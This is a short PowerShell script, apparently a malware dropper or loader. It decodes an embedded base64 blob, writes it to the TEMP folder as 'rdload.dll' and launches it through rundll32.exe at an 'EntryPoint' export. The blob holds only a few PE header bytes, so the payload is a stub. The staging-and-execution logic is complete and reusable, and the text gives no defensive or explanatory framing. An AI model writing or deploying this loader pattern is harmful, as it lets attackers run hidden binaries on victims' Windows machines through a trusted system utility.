$data = 'TVpQAAIAAABQRQAA'
$bytes = [System.Convert]::FromBase64String($data)
$path = "$env:TEMP\rdload.dll"
[IO.File]::WriteAllBytes($path, $bytes)
Start-Process 'rundll32.exe' -ArgumentList "$path,EntryPoint"
